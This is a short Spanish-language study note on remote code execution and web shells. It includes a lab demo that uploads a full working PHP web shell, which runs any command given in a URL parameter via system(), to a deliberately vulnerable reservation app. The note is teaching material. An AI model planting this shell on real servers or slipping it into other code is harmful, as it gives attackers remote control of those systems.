---
{"dg-publish":true,"permalink":"/Ciberseguridad/Ataques/Web-Shell y RCE/"}
---

# Remote Code Execution
Básicamente cuando un atacante encuentra una forma de correr su propio código en un sistema. Esto puede servirle para utilizar el servidor al cual se conecto, como si fuera propio, tomar control total, exfiltrar datos, etc.

# Web shell
Un web shell es un script que es subido por un atacante a un servidor vulnerable. El script se accede desde la misma página de manera remota y con él podriamos ejecutar RCE desde él. También podemos usarlo para movernos lateralmente en un servidor o pivotear a otros servicios.
Usualmente se crea una interfaz web para interactuar con la shell, he ahí el nombre.

# Test
<a href="https://codeastro.com/online-railway-reservation-system-in-php-with-source-code/"> Para ejemplificar podemos descargar el Online Railway Reservation System de codeastro.com</a>
Está diseñado con diversas vulnerabilidades.
Lo montamos en nuestra máquina de pruebas y nos vamos a alguna parte que nos requiera subir un archivo:
![](https://i.imgur.com/3mFb89c.png)

Le vamos a cargar shell.php:
```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```
Básicamente crea un formulario con input que tiene acceso a ejecutar comandos e imprime el resultado. Lanzando el comando pwd obtenemos lo siguiente.
![](https://i.imgur.com/RWHoPo0.png)
De ahí podriamos correr `whoami`, `ls`, `hostname`, `uname -a`, etc.